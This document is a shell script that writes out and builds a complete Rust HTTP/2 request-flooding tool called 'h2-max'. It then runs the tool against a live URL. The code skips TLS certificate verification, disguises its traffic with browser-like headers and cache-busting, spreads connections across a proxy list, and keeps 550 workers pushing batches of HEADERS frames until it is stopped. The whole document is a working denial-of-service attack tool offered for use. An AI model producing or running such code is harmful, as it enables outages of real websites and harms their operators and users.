mkdir h2-max
cd h2-max
cargo init
cat > Cargo.toml << 'EOF'
[package]
name = "h2-max"
version = "0.4.0"
edition = "2021"

[dependencies]
tokio = { version = "1", features = ["full", "net"] }
tokio-rustls = "0.26"
rustls = { version = "0.23", features = ["ring"] }
bytes = "1"
once_cell = "1.19"
libc = "0.2"

[profile.release]
opt-level = 3
lto = true
codegen-units = 1
strip = true
panic = "abort"
EOF
cat > src/main.rs << 'RUSTCODE'
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicU32, Ordering};
use std::sync::Arc;
use std::time::Duration;
use std::io;
use std::net::ToSocketAddrs;
use std::fs;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Mutex as TokioMutex;
use tokio::time::timeout;
use tokio_rustls::TlsConnector;
use bytes::{BufMut, BytesMut};
use once_cell::sync::Lazy;

use rustls::ClientConfig;
use rustls::crypto::ring;
use rustls::pki_types::{ServerName, UnixTime};
use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};

type H2Stream = tokio_rustls::client::TlsStream<TcpStream>;

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const SETTINGS_FRM: &[u8] = &[
    0x00, 0x00, 0x1E, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x03, 0x00, 0x00, 0x00, 0x64,
    0x00, 0x04, 0x00, 0x02, 0x00, 0x00,
    0x00, 0x06, 0x00, 0x04, 0x00, 0x00,
];

const SETTINGS_ACK: &[u8] = &[0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00];

const WINDOW_UPDATE_CONN: &[u8] = &[
    0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xF0, 0x00, 0x00,
];

#[derive(Debug)]
struct SkipServerVerification;

impl ServerCertVerifier for SkipServerVerification {
    fn verify_tls12_signature(&self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>, _dss: &rustls::DigitallySignedStruct) -> Result<HandshakeSignatureValid, rustls::Error> { Ok(HandshakeSignatureValid::assertion()) }
    fn verify_tls13_signature(&self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>, _dss: &rustls::DigitallySignedStruct) -> Result<HandshakeSignatureValid, rustls::Error> { Ok(HandshakeSignatureValid::assertion()) }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> { vec![rustls::SignatureScheme::RSA_PKCS1_SHA256, rustls::SignatureScheme::ECDSA_NISTP256_SHA256, rustls::SignatureScheme::ED25519] }
    fn verify_server_cert(&self, _end_entity: &rustls::pki_types::CertificateDer<'_>, _intermediates: &[rustls::pki_types::CertificateDer<'_>], _server_name: &ServerName<'_>, _ocsp_response: &[u8], _now: UnixTime) -> Result<ServerCertVerified, rustls::Error> { Ok(ServerCertVerified::assertion()) }
}

thread_local! {
    static BATCH_BUF: std::cell::RefCell<BytesMut> = std::cell::RefCell::new(BytesMut::with_capacity(128 * 1024));
}

static TLS_CONNECTOR: Lazy<TlsConnector> = Lazy::new(|| {
    let cfg = ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(SkipServerVerification))
        .with_no_client_auth();
        
    let mut config = cfg;
    config.alpn_protocols = vec![b"h2".to_vec()];
    TlsConnector::from(Arc::new(config))
});

static PROXY_IDX: AtomicU64 = AtomicU64::new(0);

#[cfg(target_os = "linux")]
fn tune_socket(s: &TcpStream) -> io::Result<()> {
    use std::os::unix::io::AsRawFd;
    s.set_nodelay(true)?;
    let size: u32 = 256 * 1024;
    let res = unsafe {
        libc::setsockopt(
            s.as_raw_fd(),
            libc::SOL_SOCKET,
            libc::SO_SNDBUF,
            &size as *const _ as *const libc::c_void,
            std::mem::size_of::<u32>() as u32,
        )
    };
    if res != 0 { return Err(io::Error::last_os_error()); }
    Ok(())
}

#[cfg(not(target_os = "linux"))]
fn tune_socket(s: &TcpStream) -> io::Result<()> {
    s.set_nodelay(true)
}

struct HPACKEncoder {
    static_table: Vec<(&'static str, &'static str)>,
}

impl HPACKEncoder {
    fn new() -> Self {
        HPACKEncoder {
            static_table: vec![
                (":authority", ""), (":method", "GET"), (":method", "POST"), (":path", "/"),
                (":path", "/index.html"), (":scheme", "http"), (":scheme", "https"), (":status", "200"),
                (":status", "204"), (":status", "206"), (":status", "304"), (":status", "400"),
                (":status", "404"), (":status", "500"), ("accept-charset", ""), ("accept-encoding", "gzip, deflate"),
                ("accept-language", ""), ("accept-ranges", ""), ("accept", ""), ("access-control-allow-origin", ""),
                ("age", ""), ("allow", ""), ("authorization", ""), ("cache-control", ""),
                ("content-disposition", ""), ("content-encoding", ""), ("content-language", ""), ("content-length", ""),
                ("content-location", ""), ("content-range", ""), ("content-type", ""), ("cookie", ""),
                ("date", ""), ("etag", ""), ("expect", ""), ("expires", ""), ("from", ""), ("host", ""),
                ("if-match", ""), ("if-modified-since", ""), ("if-none-match", ""), ("if-range", ""),
                ("if-unmodified-since", ""), ("last-modified", ""), ("link", ""), ("location", ""),
                ("max-forwards", ""), ("proxy-authenticate", ""), ("proxy-authorization", ""), ("range", ""),
                ("referer", ""), ("refresh", ""), ("retry-after", ""), ("server", ""), ("set-cookie", ""),
                ("strict-transport-security", ""), ("transfer-encoding", ""), ("user-agent", ""), ("vary", ""),
                ("via", ""), ("www-authenticate", ""),
            ],
        }
    }

    fn find_static_index(&self, name: &str, value: &str) -> usize {
        self.static_table.iter().position(|(n, v)| *n == name && (value.is_empty() || *v == value)).map(|i| i + 1).unwrap_or(0)
    }

    fn encode_string(&self, s: &str, buf: &mut Vec<u8>) {
        let len = s.len();
        if len < 128 { buf.push(len as u8); } else {
            let mut l = len as u32;
            buf.push(0x80 | (l & 0x7F) as u8);
            l >>= 7;
            while l > 0 { let mut b = (l & 0x7F) as u8; l >>= 7; if l > 0 { b |= 0x80; } buf.push(b); }
        }
        buf.extend_from_slice(s.as_bytes());
    }

    fn encode_headers(&self, headers: &[(&str, &str)], buf: &mut Vec<u8>) {
        for (name, value) in headers {
            let idx = self.find_static_index(name, value);
            if idx > 0 {
                if value.is_empty() { buf.push(0x80 | idx as u8); } else { buf.push(0x40 | idx as u8); self.encode_string(value, buf); }
            } else { buf.push(0x00); self.encode_string(name, buf); self.encode_string(value, buf); }
        }
    }
}

static HPACK_ENCODER: Lazy<HPACKEncoder> = Lazy::new(HPACKEncoder::new);

fn precompute_hpack(host: &str, path: &str) -> Vec<u8> {
    let headers = [
        (":method", "GET"),
        (":path", path),
        (":scheme", "https"),
        (":authority", host),
        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"),
        ("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"),
        ("accept-language", "en-US,en;q=0.5"),
        ("accept-encoding", "gzip, deflate, br, zstd"),
        ("cache-control", "no-cache, no-store, max-age=0, must-revalidate"),
        ("pragma", "no-cache"),
        ("sec-fetch-dest", "document"),
        ("sec-fetch-mode", "navigate"),
        ("sec-fetch-site", "none"),
        ("sec-fetch-user", "?1"),
        ("upgrade-insecure-requests", "1"),
    ];
    let mut buf = Vec::with_capacity(256);
    HPACK_ENCODER.encode_headers(&headers, &mut buf);
    buf
}

fn load_proxies(path: &str) -> Vec<String> {
    let content = fs::read_to_string(path).unwrap_or_default();
    content.lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && l.contains(':'))
        .collect()
}

#[inline(always)]
fn next_proxy(proxies: &[String]) -> &str {
    let idx = PROXY_IDX.fetch_add(1, Ordering::Relaxed) as usize % proxies.len();
    &proxies[idx]
}

async fn dial_proxy(proxy: &str, connect_req: &[u8], timeout_dur: Duration) -> io::Result<TcpStream> {
    let tcp = timeout(timeout_dur, TcpStream::connect(proxy)).await??;
    tune_socket(&tcp)?;
    let mut s = tcp;
    s.write_all(connect_req).await?;
    s.flush().await?;

    let mut buf = [0u8; 512];
    let mut total = 0usize;
    timeout(Duration::from_secs(5), async {
        loop {
            let n = s.read(&mut buf[total..]).await?;
            if n == 0 { return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "proxy closed")); }
            total += n;
            if total >= 4 && &buf[total - 4..total] == b"\r\n\r\n" {
                let resp = std::str::from_utf8(&buf[..total]).unwrap_or("");
                if resp.contains("200") { return Ok(()); }
                let status = resp.lines().next().unwrap_or("unknown");
                return Err(io::Error::new(io::ErrorKind::Other, format!("proxy: {}", status.trim())));
            }
            if total >= 512 { return Err(io::Error::new(io::ErrorKind::Other, "proxy resp overflow")); }
        }
    }).await??;

    Ok(s)
}

async fn setup_h2(tcp_stream: TcpStream, host: &str, config: Arc<Config>, hpack_payload: Arc<Vec<u8>>) -> io::Result<(Conn, tokio::io::ReadHalf<H2Stream>)> {
    let server_name = ServerName::try_from(host).map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?.to_owned();
    let mut stream = TLS_CONNECTOR.connect(server_name, tcp_stream).await.map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    stream.write_all(PREFACE).await?;
    stream.write_all(SETTINGS_FRM).await?;
    stream.flush().await?;

    loop {
        let mut header = [0u8; 9];
        timeout(Duration::from_secs(3), stream.read_exact(&mut header)).await??;
        let length = u32::from_be_bytes([header[0], header[1], header[2], header[3]]) >> 8;
        let frame_type = header[3];
        let flags = header[4];

        if frame_type == 0x04 && flags & 0x01 != 0 { continue; }
        if frame_type != 0x04 { return Err(io::Error::new(io::ErrorKind::Other, "expected settings")); }

        if length > 0 {
            let mut payload = vec![0u8; length as usize];
            stream.read_exact(&mut payload).await?;
        }

        stream.write_all(SETTINGS_ACK).await?;
        break;
    }

    stream.write_all(WINDOW_UPDATE_CONN).await?;
    stream.flush().await?;

    let (read_half, write_half) = tokio::io::split(stream);

    Ok((Conn {
        write_half: Arc::new(TokioMutex::new(write_half)),
        stream_id: AtomicU32::new(0),
        closed: Arc::new(AtomicBool::new(false)),
        hpack_payload,
        config
    }, read_half))
}

#[inline(always)]
fn write_h2_frame_inline(length: u32, frame_type: u8, flags: u8, stream: u32, payload: &[u8], buf: &mut BytesMut) {
    let header = (length << 8) | frame_type as u32;
    buf.extend_from_slice(&header.to_be_bytes());
    buf.put_u8(flags);
    buf.extend_from_slice(&stream.to_be_bytes());
    if !payload.is_empty() { buf.extend_from_slice(payload); }
}

struct Config { workers: usize, batch_size: usize, max_stream_id: u32, dial_timeout: Duration }
impl Default for Config {
    fn default() -> Self { Config { workers: 550, batch_size: 100, max_stream_id: 1_000_000, dial_timeout: Duration::from_secs(1) } }
}

struct Conn {
    write_half: Arc<TokioMutex<tokio::io::WriteHalf<H2Stream>>>,
    stream_id: AtomicU32,
    closed: Arc<AtomicBool>,
    hpack_payload: Arc<Vec<u8>>,
    config: Arc<Config>,
}

impl Conn {
    #[inline(always)]
    fn next_stream_id(&self) -> u32 {
        loop {
            let current = self.stream_id.load(Ordering::Relaxed);
            let next = if current == 0 { 1 } else { let n = current + 2; if n > self.config.max_stream_id { 1 } else { n } };
            if self.stream_id.compare_exchange_weak(current, next, Ordering::Relaxed, Ordering::Relaxed).is_ok() { return next; }
        }
    }

    #[inline(always)]
    fn is_closed(&self) -> bool { self.closed.load(Ordering::Relaxed) }
    fn close(&self) { self.closed.store(true, Ordering::Relaxed); }

    async fn send_batch(&self) -> io::Result<()> {
        if self.is_closed() { return Err(io::Error::new(io::ErrorKind::Other, "closed")); }
        
        let data = BATCH_BUF.with(|buf| {
            let mut buf = buf.borrow_mut();
            buf.clear();
            let payload = &self.hpack_payload;
            let len = payload.len() as u32;
            for _ in 0..self.config.batch_size {
                write_h2_frame_inline(len, 0x01, 0x05, self.next_stream_id(), payload, &mut buf);
            }
            let buf_len = buf.len();
            buf.split_to(buf_len).freeze()
        });
        
        let mut write_stream = self.write_half.lock().await;
        write_stream.write_all(&data).await?;
        write_stream.flush().await?;
        Ok(())
    }
}

struct WorkerState {
    conn: Conn,
    _reader: tokio::task::JoinHandle<()>,
}

async fn establish_connection(
    ip: &str, port: u16, host: &str,
    config: Arc<Config>, hpack_payload: Arc<Vec<u8>>,
    proxies: Arc<Vec<String>>, connect_req: Arc<Vec<u8>>,
    running: Arc<AtomicBool>
) -> Option<WorkerState> {
    if !running.load(Ordering::Relaxed) { return None; }

    let tcp_stream = if !proxies.is_empty() {
        let proxy = next_proxy(&proxies);
        match dial_proxy(proxy, &connect_req, config.dial_timeout).await {
            Ok(t) => t,
            Err(_) => return None,
        }
    } else {
        match timeout(config.dial_timeout, TcpStream::connect(format!("{}:{}", ip, port))).await {
            Ok(Ok(s)) => { let _ = tune_socket(&s); s }
            _ => return None,
        }
    };

    if !running.load(Ordering::Relaxed) { return None; }

    let (conn, read_half) = match setup_h2(tcp_stream, host, config, hpack_payload).await {
        Ok(c) => c,
        Err(_) => return None,
    };

    let drain_write = conn.write_half.clone();
    let closed = conn.closed.clone();

    let reader = tokio::spawn(async move {
        let mut buf = [0u8; 65536];
        let mut read_stream = read_half;
        loop {
            if closed.load(Ordering::Relaxed) { break; }

            let read_result = match timeout(Duration::from_secs(3), read_stream.read(&mut buf)).await {
                Ok(res) => res,
                Err(_) => continue,
            };

            match read_result {
                Ok(0) => { closed.store(true, Ordering::Relaxed); break; }
                Ok(n) if n >= 9 => {
                    let length = u32::from_be_bytes([buf[0], buf[1], buf[2], buf[3]]) >> 8;
                    let frame_type = buf[3];
                    let flags = buf[4];

                    if length > 0 && length < 65000 {
                        let _ = read_stream.read(&mut buf[9..9+length as usize]).await;
                    }

                    if frame_type == 0x04 && flags & 0x01 == 0 {
                        let mut write_stream = drain_write.lock().await;
                        let _ = write_stream.write_all(SETTINGS_ACK).await;
                    } else if frame_type == 0x06 && flags & 0x01 == 0 {
                        let mut ping_ack = [0u8; 17];
                        ping_ack[0..4].copy_from_slice(&((8u32 << 8) | 0x06u32).to_be_bytes());
                        ping_ack[4] = 0x01;
                        ping_ack[9..17].copy_from_slice(&buf[9..17]);
                        let mut write_stream = drain_write.lock().await;
                        let _ = write_stream.write_all(&ping_ack).await;
                    } else if frame_type == 0x07 {
                        closed.store(true, Ordering::Relaxed);
                        return;
                    }
                }
                Ok(_) => continue,
                Err(_) => break,
            }
        }
    });

    Some(WorkerState { conn, _reader: reader })
}

async fn run_worker(ip: String, port: u16, host: String, config: Arc<Config>, hpack_payload: Arc<Vec<u8>>, running: Arc<AtomicBool>, proxies: Arc<Vec<String>>, connect_req: Arc<Vec<u8>>) {
    let mut state = match establish_connection(&ip, port, &host, config.clone(), hpack_payload.clone(), proxies.clone(), connect_req.clone(), running.clone()).await {
        Some(s) => s,
        None => return,
    };

    let mut next_handle: Option<tokio::task::JoinHandle<Option<WorkerState>>> = None;

    while running.load(Ordering::Relaxed) {
        if next_handle.is_none() {
            let ip = ip.clone();
            let h = host.clone();
            let c = config.clone();
            let hp = hpack_payload.clone();
            let p = proxies.clone();
            let cr = connect_req.clone();
            let r = running.clone();
            next_handle = Some(tokio::spawn(async move {
                establish_connection(&ip, port, &h, c, hp, p, cr, r).await
            }));
        }

        while running.load(Ordering::Relaxed) && !state.conn.is_closed() {
            if state.conn.send_batch().await.is_err() { break; }
        }
        state.conn.close();

        state = match next_handle.take() {
            Some(handle) => match handle.await {
                Ok(Some(s)) => s,
                _ => {
                    if !running.load(Ordering::Relaxed) { return; }
                    match establish_connection(&ip, port, &host, config.clone(), hpack_payload.clone(), proxies.clone(), connect_req.clone(), running.clone()).await {
                        Some(s) => s,
                        None => return,
                    }
                }
            },
            None => return,
        };
    }
}

fn parse_target(raw_url: &str) -> (String, u16, String) {
    let mut url = raw_url.to_string();
    if url.starts_with("https://") { url = url[8..].to_string(); }
    let (host_port, path) = if let Some(idx) = url.find('/') { (url[..idx].to_string(), url[idx..].to_string()) } else { (url, "/".to_string()) };
    let (host, port) = if let Some(idx) = host_port.find(':') { (host_port[..idx].to_string(), host_port[idx+1..].parse().unwrap_or(443)) } else { (host_port, 443) };
    (host, port, path)
}

fn print_banner() {
    println!("\x1b[97m\n\n:::::::-.  :::::::::      .,~:::::    .:::.\n");
    println!("\x1b[38;5;218m ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.\n");
    println!("\x1b[38;5;204m `[[     [[    .n[['    [[[          ''  ,['\n");
    println!("\x1b[38;5;203m  $$,    $$  ,$$P\" cccc $$$          .c$$P'\n");
    println!("\x1b[31m  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,\n");
    println!("\x1b[91m  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^\n");
    println!("\x1b[0m\x1b[31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m");
    println!("\x1b[32m〇\x1b[0m \x1b[37mAuthor\x1b[0m \x1b[31m:\x1b[0m \x1b[37mDiz Flyze Ofc\x1b[0m");
    println!("\x1b[32m〇\x1b[0m \x1b[37mMode  \x1b[0m \x1b[31m:\x1b[0m \x1b[37mMAX-RPS");
    println!("\x1b[32m〇\x1b[0m \x1b[37mMethod\x1b[0m \x1b[31m:\x1b[0m \x1b[37mGET");
    println!("\x1b[32m〇\x1b[0m \x1b[37mUlimit\x1b[0m \x1b[31m:\x1b[0m \x1b[37m1048576");
    println!("\x1b[32m〇\x1b[0m \x1b[37mTLS    \x1b[0m \x1b[31m:\x1b[0m \x1b[37mFF128-Patched");
    println!("\x1b[32m〇\x1b[0m \x1b[37mPreWarm\x1b[0m \x1b[31m:\x1b[0m \x1b[37mON");
    println!("\x1b[31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n");
}

#[tokio::main(flavor = "multi_thread", worker_threads = 8)]
async fn main() {
    print_banner();
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 { eprintln!("Usage: ./h2-max <target>"); std::process::exit(1); }
    let (host, port, path) = parse_target(&args[1]);
    let config = Arc::new(Config::default());
    let hpack_payload = Arc::new(precompute_hpack(&host, &path));
    let connect_req = Arc::new(format!("CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n\r\n", host, port, host, port).into_bytes());

    let socket_addr = format!("{}:{}", host, port);
    let ip = socket_addr.to_socket_addrs()
        .expect("Gagal Resolve!")
        .next()
        .expect("Tidak Ada IP!")
        .ip()
        .to_string();

    let proxies: Vec<String> = load_proxies("proxy.txt");
    let proxies = Arc::new(proxies);
    let use_proxy = !proxies.is_empty();

    println!("Target: {}\nHost IP: {}\nPort: {}\nWorkers: {}\nBatch: {}\nMax Streams: {}\nProxy: {}\n\n",
        host, ip, port, config.workers, config.batch_size, config.max_stream_id,
        if use_proxy { format!("{} proxy loaded", proxies.len()) } else { "Direct (no proxy.txt)".to_string() }
    );

    let running = Arc::new(AtomicBool::new(true));
    let mut handles = Vec::with_capacity(config.workers);

    for _ in 0..config.workers {
        let ip = ip.clone();
        let h = host.clone();
        let c = config.clone();
        let hp = hpack_payload.clone();
        let r = running.clone();
        let p = proxies.clone();
        let cr = connect_req.clone();
        handles.push(tokio::spawn(async move { run_worker(ip, port, h, c, hp, r, p, cr).await; }));
    }
    tokio::signal::ctrl_c().await.ok();
    running.store(false, Ordering::Relaxed);
    for handle in handles { let _ = handle.await; }
}
RUSTCODE
cargo build --release
ulimit -n 1048576
./target/release/h2-max https://dstat.countbot.uk/
